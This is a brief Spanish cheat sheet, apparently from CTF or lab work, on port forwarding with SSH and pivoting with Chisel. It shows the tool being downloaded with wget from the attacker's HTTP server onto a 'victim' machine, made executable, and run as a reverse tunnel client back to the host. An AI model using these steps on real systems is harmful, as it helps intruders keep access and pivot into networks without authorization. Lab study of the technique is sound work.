## Con SSH

```bash
#Desde el host
ssh USER@IP -L <PORT>:localhost:<PORT>
```

Así redirijo el flujo del puerto a la máquina host, y en el buscador pongo:

```bash
URL= http://localhost:<PORT>
```

## Con Chisel

Donde tenga chisel en mi maquina host:

```bash
python3 -m http.server 80 
```

Desde la maquina victima:

```bash
cd /tmp
wget http://172.17.0.1/chisel
chmod +x chisel
```

Desde el host abro el servidor:

```bash
chisel server --reverse -p <PORT>
```

Y abro el cliente desde la máquina victima:

```bash
./chisel client <IP_HOST>:<PORT> R:<VICTIM_PORT>:localhost:<VICTIM_PORT>
```

Y desde el navegador configurar el proxy con el puerto y habilitar la opción SOCKS v5
